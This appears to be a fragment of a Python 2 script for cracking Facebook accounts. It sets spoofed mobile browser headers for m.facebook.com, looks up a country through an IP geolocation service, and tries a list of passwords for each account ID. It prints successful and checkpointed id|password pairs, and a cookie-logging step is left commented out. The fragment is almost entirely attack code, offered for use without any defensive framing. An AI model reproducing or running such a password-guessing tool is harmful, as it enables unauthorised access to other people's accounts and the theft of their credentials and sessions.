...
h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; U; Android 7.1.2; ru-ru; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.1.5-g","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
...
try:
	...
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; U; Android 7.0; en-us; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.9.6"}).json()["country_name"].lower()
except:
	ips=None
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print 50*  "\033[1;97m─"
					print(G+"\r[Succesfully] -> %s|%s ----> %s    "%(fl.get("id"),i,N))
					print 50*  "\033[1;97m─"
...
#					ceks(log.get("cookies"),ko) # --> skip logger
					...
					print(O+"\r[Chekpoint] -> %s|%s ----> %s    "%(fl.get("id"),i,N))
